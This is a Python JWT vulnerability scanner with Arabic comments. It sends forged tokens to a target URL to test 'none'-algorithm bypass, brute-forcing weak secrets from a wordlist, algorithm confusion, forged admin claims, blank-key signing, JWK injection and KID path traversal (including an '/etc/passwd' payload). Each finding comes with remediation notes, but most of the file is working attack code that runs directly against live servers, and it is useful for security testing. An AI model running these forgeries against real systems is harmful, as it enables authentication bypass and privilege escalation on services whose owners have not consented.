"""
JWT Vulnerabilities Scanner
كشف ثغرات JSON Web Tokens
"""

import requests
import jwt
import json
import base64
from typing import List, Dict, Optional
import hmac
import hashlib


class JWTScanner:
    """ماسح ثغرات JWT"""
    
    def __init__(self, target: str, token: str = None, config: dict = None):
        self.target = target
        self.token = token
        self.config = config or {}
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # قائمة Secret Keys الشائعة للتجربة
        self.common_secrets = [
            'secret', 'Secret', 'SECRET',
            'password', 'Password', 'PASSWORD',
            'key', 'Key', 'KEY',
            'jwt_secret', 'JWT_SECRET',
            'secret_key', 'SECRET_KEY',
            '123456', '12345678',
            'qwerty', 'abc123',
            '', 'null', 'none',
            'your-256-bit-secret',
            'your-secret-key',
            'HS256', 'HS384', 'HS512'
        ]
        
    def scan(self) -> List[Dict]:
        """تنفيذ الفحص الكامل"""
        print(f"🔍 Starting JWT Vulnerabilities scan on: {self.target}")
        
        if not self.token:
            self.token = self._extract_jwt_from_response()
        
        if not self.token:
            print("  ⚠️  No JWT token found")
            return self.vulnerabilities
        
        print(f"  🎫 JWT Token found: {self.token[:50]}...")
        
        # 1. None Algorithm Attack
        self._test_none_algorithm()
        
        # 2. Weak Secret Key
        self._test_weak_secret()
        
        # 3. Algorithm Confusion (RS256 to HS256)
        self._test_algorithm_confusion()
        
        # 4. JWT Claims Manipulation
        self._test_claims_manipulation()
        
        # 5. Blank Password
        self._test_blank_password()
        
        # 6. Key Injection
        self._test_key_injection()
        
        # 7. KID (Key ID) Manipulation
        self._test_kid_manipulation()
        
        print(f"✅ Found {len(self.vulnerabilities)} JWT vulnerabilities")
        return self.vulnerabilities
    
    def _extract_jwt_from_response(self) -> Optional[str]:
        """استخراج JWT من الاستجابة"""
        try:
            response = self.session.get(self.target, timeout=10)
            
            # البحث في Headers
            auth_header = response.headers.get('Authorization', '')
            if 'Bearer ' in auth_header:
                return auth_header.replace('Bearer ', '')
            
            # البحث في Cookies
            for cookie_name in ['token', 'jwt', 'access_token', 'auth_token']:
                if cookie_name in response.cookies:
                    return response.cookies[cookie_name]
            
            # البحث في Response Body
            if 'token' in response.text:
                try:
                    data = response.json()
                    for key in ['token', 'jwt', 'access_token', 'accessToken']:
                        if key in data:
                            return data[key]
                except:
                    pass
            
            return None
            
        except Exception as e:
            return None
    
    def _decode_jwt(self, token: str) -> Optional[Dict]:
        """فك تشفير JWT بدون التحقق"""
        try:
            # فك Header
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(
                base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8')
            )
            
            # فك Payload
            payload = json.loads(
                base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8')
            )
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }
            
        except Exception as e:
            return None
    
    def _test_none_algorithm(self):
        """اختبار None Algorithm Attack"""
        print("  📡 Testing None Algorithm attack...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            # تعديل Algorithm إلى none
            decoded['header']['alg'] = 'none'
            decoded['header']['typ'] = 'JWT'
            
            # بناء JWT جديد بدون توقيع
            new_header = base64.urlsafe_b64encode(
                json.dumps(decoded['header']).encode()
            ).decode().rstrip('=')
            
            new_payload = base64.urlsafe_b64encode(
                json.dumps(decoded['payload']).encode()
            ).decode().rstrip('=')
            
            # JWT بدون signature
            new_token = f"{new_header}.{new_payload}."
            
            # اختبار التوكن الجديد
            if self._test_jwt_token(new_token):
                self.vulnerabilities.append({
                    'type': 'JWT Vulnerability',
                    'subtype': 'None Algorithm Attack',
                    'severity': 'critical',
                    'url': self.target,
                    'original_token': self.token[:50] + '...',
                    'exploited_token': new_token[:50] + '...',
                    'confidence': 95,
                    'description': 'JWT accepts "none" algorithm, allowing signature bypass',
                    'remediation': 'Reject tokens with "none" algorithm explicitly'
                })
                print("    ✅ None Algorithm vulnerability found!")
                
        except Exception as e:
            pass
    
    def _test_weak_secret(self):
        """اختبار Secret Key الضعيف"""
        print("  📡 Testing weak secret keys...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            algorithm = decoded['header'].get('alg', 'HS256')
            
            for secret in self.common_secrets:
                try:
                    # محاولة التحقق من التوقيع
                    jwt.decode(
                        self.token,
                        secret,
                        algorithms=[algorithm]
                    )
                    
                    # إذا نجحت، فالـ secret ضعيف
                    self.vulnerabilities.append({
                        'type': 'JWT Vulnerability',
                        'subtype': 'Weak Secret Key',
                        'severity': 'critical',
                        'url': self.target,
                        'secret_key': secret,
                        'algorithm': algorithm,
                        'confidence': 99,
                        'description': f'JWT uses weak secret key: "{secret}"',
                        'remediation': 'Use strong, random secret key (minimum 256 bits)'
                    })
                    print(f"    ✅ Weak secret found: {secret}")
                    return  # توقف عند أول secret صحيح
                    
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
                    
        except Exception as e:
            pass
    
    def _test_algorithm_confusion(self):
        """اختبار Algorithm Confusion (RS256 to HS256)"""
        print("  📡 Testing algorithm confusion...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            original_alg = decoded['header'].get('alg', '')
            
            # إذا كان RS256، نحاول تحويله لـ HS256
            if original_alg == 'RS256':
                decoded['header']['alg'] = 'HS256'
                
                # محاولة توقيع بمفتاح عام (Public Key)
                # في الواقع، سنحتاج للمفتاح العام من الخادم
                
                self.vulnerabilities.append({
                    'type': 'JWT Vulnerability',
                    'subtype': 'Algorithm Confusion',
                    'severity': 'high',
                    'url': self.target,
                    'original_algorithm': original_alg,
                    'exploitable': 'Potentially',
                    'confidence': 60,
                    'description': 'JWT may be vulnerable to algorithm confusion attack',
                    'remediation': 'Validate algorithm strictly on server side'
                })
                print("    ⚠️  Potential algorithm confusion vulnerability")
                
        except Exception as e:
            pass
    
    def _test_claims_manipulation(self):
        """اختبار التلاعب بـ Claims"""
        print("  📡 Testing claims manipulation...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            payload = decoded['payload']
            
            # تعديل Claims
            modified_payloads = []
            
            # تعديل User ID
            if 'user_id' in payload or 'sub' in payload:
                temp = payload.copy()
                temp['user_id'] = 1
                temp['sub'] = 'admin'
                modified_payloads.append(('user_id', temp))
            
            # تعديل Role/Permissions
            if 'role' in payload:
                temp = payload.copy()
                temp['role'] = 'admin'
                modified_payloads.append(('role', temp))
            
            # تعديل is_admin
            temp = payload.copy()
            temp['is_admin'] = True
            temp['admin'] = True
            modified_payloads.append(('admin_flag', temp))
            
            # اختبار كل payload معدل
            for claim_name, modified_payload in modified_payloads:
                new_header = base64.urlsafe_b64encode(
                    json.dumps(decoded['header']).encode()
                ).decode().rstrip('=')
                
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(modified_payload).encode()
                ).decode().rstrip('=')
                
                new_token = f"{new_header}.{new_payload}.{decoded['signature']}"
                
                if self._test_jwt_token(new_token):
                    self.vulnerabilities.append({
                        'type': 'JWT Vulnerability',
                        'subtype': 'Claims Manipulation',
                        'severity': 'high',
                        'url': self.target,
                        'manipulated_claim': claim_name,
                        'confidence': 80,
                        'description': f'JWT claims can be manipulated: {claim_name}',
                        'remediation': 'Validate JWT signature and claims server-side'
                    })
                    print(f"    ✅ Claims manipulation successful: {claim_name}")
                    
        except Exception as e:
            pass
    
    def _test_blank_password(self):
        """اختبار كلمة مرور فارغة"""
        print("  📡 Testing blank password...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            algorithm = decoded['header'].get('alg', 'HS256')
            
            # محاولة توقيع بكلمة مرور فارغة
            new_token = jwt.encode(
                decoded['payload'],
                '',
                algorithm=algorithm
            )
            
            if self._test_jwt_token(new_token):
                self.vulnerabilities.append({
                    'type': 'JWT Vulnerability',
                    'subtype': 'Blank Password',
                    'severity': 'critical',
                    'url': self.target,
                    'confidence': 95,
                    'description': 'JWT accepts blank/empty password',
                    'remediation': 'Use strong secret key, reject blank passwords'
                })
                print("    ✅ Blank password vulnerability found!")
                
        except Exception as e:
            pass
    
    def _test_key_injection(self):
        """اختبار Key Injection في Header"""
        print("  📡 Testing key injection...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            # إضافة jwk في header
            decoded['header']['jwk'] = {
                "kty": "oct",
                "k": base64.urlsafe_b64encode(b"secret").decode().rstrip('=')
            }
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(decoded['header']).encode()
            ).decode().rstrip('=')
            
            new_payload = base64.urlsafe_b64encode(
                json.dumps(decoded['payload']).encode()
            ).decode().rstrip('=')
            
            # توقيع بـ "secret"
            new_token = jwt.encode(
                decoded['payload'],
                'secret',
                algorithm='HS256',
                headers=decoded['header']
            )
            
            if self._test_jwt_token(new_token):
                self.vulnerabilities.append({
                    'type': 'JWT Vulnerability',
                    'subtype': 'Key Injection',
                    'severity': 'critical',
                    'url': self.target,
                    'confidence': 90,
                    'description': 'JWT header accepts injected JWK',
                    'remediation': 'Reject tokens with embedded keys'
                })
                print("    ✅ Key injection vulnerability found!")
                
        except Exception as e:
            pass
    
    def _test_kid_manipulation(self):
        """اختبار KID (Key ID) Manipulation"""
        print("  📡 Testing KID manipulation...")
        
        try:
            decoded = self._decode_jwt(self.token)
            if not decoded:
                return
            
            # Path Traversal في kid
            kid_payloads = [
                '../../../dev/null',
                '/dev/null',
                '../../../../etc/passwd',
                'file:///dev/null'
            ]
            
            for kid in kid_payloads:
                decoded['header']['kid'] = kid
                
                new_token = jwt.encode(
                    decoded['payload'],
                    '\x00',  # Null byte
                    algorithm=decoded['header'].get('alg', 'HS256'),
                    headers=decoded['header']
                )
                
                if self._test_jwt_token(new_token):
                    self.vulnerabilities.append({
                        'type': 'JWT Vulnerability',
                        'subtype': 'KID Manipulation',
                        'severity': 'high',
                        'url': self.target,
                        'kid_payload': kid,
                        'confidence': 75,
                        'description': f'KID parameter vulnerable to path traversal: {kid}',
                        'remediation': 'Validate and sanitize KID parameter'
                    })
                    print(f"    ✅ KID manipulation successful: {kid}")
                    
        except Exception as e:
            pass
    
    def _test_jwt_token(self, token: str) -> bool:
        """اختبار صلاحية JWT Token"""
        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.get(self.target, headers=headers, timeout=10)
            
            # إذا لم يكن 401 أو 403، فالتوكن صالح
            if response.status_code not in [401, 403]:
                # التحقق من عدم وجود رسائل خطأ
                error_indicators = ['unauthorized', 'forbidden', 'invalid token', 'expired']
                text_lower = response.text.lower()
                
                if not any(error in text_lower for error in error_indicators):
                    return True
            
            return False
            
        except Exception:
            return False
    
    def generate_report(self) -> dict:
        """توليد تقرير شامل"""
        return {
            'scanner': 'JWT Vulnerabilities Scanner',
            'target': self.target,
            'token_provided': self.token is not None,
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
            }
        }


if __name__ == "__main__":
    target = "http://example.com/api"
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NTY3ODkwLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    scanner = JWTScanner(target, token)
    results = scanner.scan()
    
    print("\n" + "="*60)
    print("📊 JWT SCAN RESULTS")
    print("="*60)
    report = scanner.generate_report()
    print(f"\nTotal Vulnerabilities: {report['total_vulnerabilities']}")
